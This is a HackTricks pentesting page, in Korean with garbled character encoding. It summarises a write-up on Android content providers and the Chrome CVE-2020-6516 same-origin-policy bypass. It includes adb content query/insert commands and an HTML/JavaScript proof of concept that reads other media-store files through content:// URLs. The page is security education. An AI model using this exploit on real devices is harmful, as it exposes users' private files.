<details>

<summary><strong>ì œë¡œë¶€í„° ì˜ì›…ì´ ë  ë•Œê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team ì „ë¬¸ê°€)</strong></a><strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì´ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— ì œì¶œ**í•˜ì„¸ìš”.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**ì´ê²ƒì€ [https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/)ì˜ í¬ìŠ¤íŠ¸ ìš”ì•½ì…ë‹ˆë‹¤**

### ë¯¸ë””ì–´ ìŠ¤í† ì–´ì—ì„œ íŒŒì¼ ëª©ë¡ ë‚˜ì—´
ë¯¸ë””ì–´ ìŠ¤í† ì–´ì—ì„œ ê´€ë¦¬ë˜ëŠ” íŒŒì¼ì„ ë‚˜ì—´í•˜ë ¤ë©´ ì•„ë˜ ëª…ë ¹ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
$ content query --uri content://media/external/file
```
ë³´ë‹¤ ì‚¬ìš©ì ì¹œí™”ì ì¸ ì¶œë ¥ì„ ìœ„í•´ ê° ìƒ‰ì¸ íŒŒì¼ì˜ ì‹ë³„ìì™€ ê²½ë¡œë§Œ í‘œì‹œí•©ë‹ˆë‹¤:
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
### ì½˜í…ì¸  í”„ë¡œë°”ì´ë”

ì½˜í…ì¸  í”„ë¡œë°”ì´ë”ëŠ” ê³ ìœ í•œ ê°œì¸ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì— ê²©ë¦¬ë©ë‹ˆë‹¤. í”„ë¡œë°”ì´ë”ì— ì•¡ì„¸ìŠ¤í•˜ë ¤ë©´ íŠ¹ì • `content://` URIê°€ í•„ìš”í•©ë‹ˆë‹¤. í”„ë¡œë°”ì´ë”ì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ê²½ë¡œì— ëŒ€í•œ ì •ë³´ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ ë§¤ë‹ˆí˜ìŠ¤íŠ¸ë‚˜ Android í”„ë ˆì„ì›Œí¬ì˜ ì†ŒìŠ¤ ì½”ë“œì—ì„œ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Chromeì˜ ì½˜í…ì¸  í”„ë¡œë°”ì´ë” ì•¡ì„¸ìŠ¤

Androidì˜ Chromeì€ `content://` ìŠ¤í‚¤ë§ˆë¥¼ í†µí•´ ì½˜í…ì¸  í”„ë¡œë°”ì´ë”ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆì–´ì„œ, ì œ3ì ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ë‚´ë³´ë‚¸ ì‚¬ì§„ì´ë‚˜ ë¬¸ì„œì™€ ê°™ì€ ë¦¬ì†ŒìŠ¤ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ì„¤ëª…í•˜ê¸° ìœ„í•´ íŒŒì¼ì„ ë¯¸ë””ì–´ ì €ì¥ì†Œì— ì‚½ì…í•œ ë‹¤ìŒ Chromeì„ í†µí•´ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

ë¯¸ë””ì–´ ì €ì¥ì†Œì— ì‚¬ìš©ì ì§€ì • í•­ëª© ì‚½ì…:
```bash
cd /sdcard
echo "Hello, world!" > test.txt
content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```
ìƒˆë¡œ ì‚½ì…ëœ íŒŒì¼ì˜ ì‹ë³„ìë¥¼ ë°œê²¬í•˜ì„¸ìš”:
```bash
content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
# Output: Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
íŒŒì¼ì€ íŒŒì¼ ì‹ë³„ìë¥¼ ì‚¬ìš©í•˜ì—¬ êµ¬ì„±ëœ URLì„ ì‚¬ìš©í•˜ì—¬ Chromeì—ì„œ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, íŠ¹ì • ì• í”Œë¦¬ì¼€ì´ì…˜ê³¼ ê´€ë ¨ëœ íŒŒì¼ì„ ë‚˜ì—´í•˜ë ¤ë©´:
```bash
content query --uri content://media/external/file --projection _id,_data | grep -i <app_name>
```
### Chrome CVE-2020-6516: Same-Origin-Policy Bypass

_Same Origin Policy_ (SOP)ëŠ” ë¸Œë¼ìš°ì €ì˜ ë³´ì•ˆ í”„ë¡œí† ì½œë¡œ, êµì°¨ ì¶œì²˜ ë¦¬ì†ŒìŠ¤ ê³µìœ  (CORS) ì •ì±…ì— ëª…ì‹œì ìœ¼ë¡œ í—ˆìš©ë˜ì§€ ì•ŠëŠ” í•œ ì›¹ í˜ì´ì§€ê°€ ë‹¤ë¥¸ ì¶œì²˜ì˜ ë¦¬ì†ŒìŠ¤ì™€ ìƒí˜¸ ì‘ìš©í•˜ëŠ” ê²ƒì„ ì œí•œí•©ë‹ˆë‹¤. ì´ ì •ì±…ì€ ì •ë³´ ëˆ„ì¶œê³¼ êµì°¨ ì‚¬ì´íŠ¸ ìš”ì²­ ìœ„ì¡°ë¥¼ ë°©ì§€í•˜ê¸° ìœ„í•œ ê²ƒì…ë‹ˆë‹¤. Chromeì€ `content://`ì„ ë¡œì»¬ ìŠ¤í‚¤ë§ˆë¡œ ê°„ì£¼í•˜ì—¬ ê° ë¡œì»¬ ìŠ¤í‚¤ë§ˆ URLì„ ë³„ë„ì˜ ì¶œì²˜ë¡œ ì·¨ê¸‰í•˜ëŠ” ì—„ê²©í•œ SOP ê·œì¹™ì„ ì‹œí–‰í•©ë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ CVE-2020-6516ì€ Chromeì˜ ì·¨ì•½ì ìœ¼ë¡œ, `content://` URLì„ í†µí•´ ë¡œë“œëœ ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ SOP ê·œì¹™ì„ ìš°íšŒí•  ìˆ˜ ìˆê²Œ í–ˆìŠµë‹ˆë‹¤. ì‹¤ì œë¡œ, `content://` URLì—ì„œ ë¡œë“œëœ JavaScript ì½”ë“œëŠ” ë‹¤ë¥¸ `content://` URLì„ í†µí•´ ë¡œë“œëœ ë¦¬ì†ŒìŠ¤ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆì—ˆìœ¼ë©°, ì´ëŠ” íŠ¹íˆ Android 10 ì´ì „ ë²„ì „ì„ ì‹¤í–‰í•˜ëŠ” Android ê¸°ê¸°ì—ì„œ ì£¼ìš”í•œ ë³´ì•ˆ ë¬¸ì œì˜€ìŠµë‹ˆë‹¤. ì—¬ê¸°ì„œëŠ” ë²”ìœ„ ì§€ì •ëœ ì €ì¥ì†Œê°€ êµ¬í˜„ë˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.

ì•„ë˜ì˜ ì¦ëª… ì½”ë“œëŠ” ì´ ì·¨ì•½ì ì„ ë³´ì—¬ì¤ë‹ˆë‹¤. HTML ë¬¸ì„œëŠ” **/sdcard**ì— ì—…ë¡œë“œëœ í›„ ë¯¸ë””ì–´ ì €ì¥ì†Œì— ì¶”ê°€ë˜ë©°, JavaScriptì—ì„œ `XMLHttpRequest`ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¯¸ë””ì–´ ì €ì¥ì†Œì˜ ë‹¤ë¥¸ íŒŒì¼ì˜ ë‚´ìš©ì— ì•¡ì„¸ìŠ¤í•˜ê³  í‘œì‹œí•˜ì—¬ SOP ê·œì¹™ì„ ìš°íšŒí•©ë‹ˆë‹¤.

Proof-of-Concept HTML:
```xml
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>ì œë¡œë¶€í„° ì˜ì›…ì´ ë  ë•Œê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜** **PDF í˜•ì‹ìœ¼ë¡œ HackTricksë¥¼ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks êµ¿ì¦ˆ**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì— ê°€ì…í•˜ê±°ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜** **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„ ì œì¶œí•˜ì—¬** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ë°** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— ê¸°ì—¬í•˜ì„¸ìš”.**

</details>
